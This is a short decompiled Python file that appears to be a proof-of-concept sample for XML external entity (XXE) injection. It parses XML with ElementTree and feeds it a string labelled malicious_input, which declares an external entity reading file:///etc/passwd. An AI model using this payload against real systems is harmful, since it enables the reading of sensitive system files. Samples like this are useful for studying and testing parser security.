# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 358_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 437 bytes
import xml.etree.ElementTree as ET

def validate(xml_input):
    tree = ET.fromstring(xml_input)
    return tree


malicious_input = '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n'
validate(malicious_input)

# okay decompiling 358_1.pyc
